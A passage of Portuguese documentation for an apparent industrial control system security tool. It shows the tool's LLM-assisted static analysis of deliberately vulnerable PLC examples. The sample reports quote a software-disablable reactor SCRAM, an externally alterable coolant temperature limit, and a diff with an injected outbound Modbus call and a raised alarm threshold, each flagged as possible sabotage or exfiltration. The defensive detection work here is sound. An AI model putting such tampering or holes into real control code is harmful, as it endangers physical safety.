| `pump_station.fbd` | FBD | Estação de bombeamento | PID não protegido, pressão sem limite |
| `scada_hmi_interface.st` | ST | Interface HMI SCADA | Injeção de comando via variável HMI, credencial exposta |

**Como usar os exemplos:**

```
ixf > sast industrialxpl/resources/sast_examples/water_treatment.st --mode sast
[*] Analisando arquivo de exemplo: water_treatment.st
[*] Este é um exemplo educacional com vulnerabilidades conhecidas...
```

**Rodar todos os exemplos em lote:**

```python
from pathlib import Path
from industrialxpl.core.sast.analyzer import SASTAnalyzer

examples_dir = Path("industrialxpl/resources/sast_examples/")
analyzer = SASTAnalyzer()

for example_file in examples_dir.glob("*.st"):
    result = analyzer.analyze_file(example_file)
    print(f"\n{'='*60}")
    print(f"Arquivo: {example_file.name}")
    print(f"Descobertas: {result.total_findings} ({result.critical_count} críticos)")
```

---

---

## Exemplos de Análise por Setor

### Análise — Resfriamento de Reator Nuclear

```
ixf > llm-key anthropic sk-ant-api03-xxx
ixf > sast industrialxpl/resources/sast_examples/nuclear_reactor_cooling.st

[*] Alvo: nuclear_reactor_cooling.st (1 arquivo, 234 linhas)
[*] Linguagem: ST | Provider: anthropic (claude-3-5-sonnet)

  RELATÓRIO DE ANÁLISE SAST — nuclear_reactor_cooling.st
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Sistema SCRAM Desabilitável via Software
    Linha 45: IF Maintenance_Mode THEN SCRAM_Enable := FALSE; END_IF;
    Impacto:  Reator não pode ser desligado de emergência durante condição crítica
    MITRE:    T0836, T0828, T0879
    Remediação: SCRAM deve ser hardware-interlocked, não software-controlado

  FINDING [SEVERITY: CRITICAL]: Temperatura de Coolant Manipulável Externamente
    Linha 89: Coolant_Temp_Max := Maintenance_Setpoint;
    Impacto:  Limite de temperatura elevável acima dos limites seguros de projeto
    Vetor:    Modbus FC16 HR[50] ou OPC UA sem autenticação
    MITRE:    T0836

  RESUMO: 2 CRITICAL, 2 HIGH, 3 MEDIUM
```

### Análise Diferencial — Descoberta de Modificação Maliciosa

```
ixf > sast /opt/plc/firmware_v3.6_baseline.st \
      --mode diff \
      --diff /opt/plc/firmware_v3.6_extracted_from_device.st

[*] Comparando firmware baseline vs extraído do dispositivo...

  RELATÓRIO DIFERENCIAL — Possível Modificação Maliciosa
  ═══════════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Instrução de Rede Adicionada (Não Documentada)
    + MB_CLIENT(REQ:=TRUE, IP_ADDR:='10.99.0.5', PORT:=502, ...);
    Análise: Conexão Modbus de saída para IP externo não documentado
    Risco:   Canal de exfiltração de dados de processo ou C2 oculto
    Ação:    Não reimplantar firmware — iniciar investigação forense imediata

  FINDING [SEVERITY: CRITICAL]: Lógica de Alarme Modificada
    Original:   IF Process_Temp > 280.0 THEN Alarm_High := TRUE; END_IF;
    Modificado: IF Process_Temp > 450.0 THEN Alarm_High := TRUE; END_IF;
    Análise:    Threshold elevado de 280°C para 450°C (60% acima do limite seguro)

  RESUMO DIFERENCIAL: 2 CRITICAL, 3 HIGH, 1 MEDIUM
```

---

## Troubleshooting SAST

### Erro: LLM não configurado

```
ixf > sast /opt/plc/test.st
[-] Nenhum provider LLM configurado.
    Use: llm-key gemini <api_key>
    Ou defina: export GOOGLE_AI_STUDIO_API_KEY=<chave>
```

**Solução:**

```
ixf > llm-key gemini AIzaSy...
[+] LLM key configured: provider=gemini len=39
```

### Erro: Rate limit do provider

O IXF tenta automaticamente com backoff exponencial. Se persistir, alterne para outro provider:

```
ixf > llm-key anthropic sk-ant-api03-xxx
[+] LLM key configured: provider=anthropic len=22
# Agora anthropic é o provider ativo
```

### Análise incompleta por tamanho

Para projetos com > 32.000 caracteres, o IXF segmenta automaticamente e consolida os relatórios parciais:

```
[*] Tamanho do projeto: 150,000 chars (muito grande)
[*] Segmentando em 5 partes para análise...
[*] Parte 1/5: safety_logic.st (10,200 chars)
[*] Parte 2/5: process_control.st (11,400 chars)
[*] Parte 3/5: communication.st (9,800 chars)
[*] Parte 4/5: hmi_interface.st (10,100 chars)
[*] Parte 5/5: batch_control.sfc (10,500 chars)
[*] Consolidando 5 relatórios parciais...
[+] Relatório consolidado: 8 CRITICAL, 12 HIGH, 15 MEDIUM
```

**Dica:** Para projetos muito grandes, analise por subsistema para resultados mais focados:

```
ixf > sast /opt/plc/projeto/safety/ --mode sast      # Safety primeiro
ixf > sast /opt/plc/projeto/processo/ --mode sast     # Processo
ixf > sast /opt/plc/projeto/comunicacao/ --mode sast  # Comunicação
```

---

*Anterior: [MITRE ATT&CK para ICS](06-mitre-attack-ics.md) | Próximo: [Protocolos e Vendors](08-protocolos-vendors.md)*
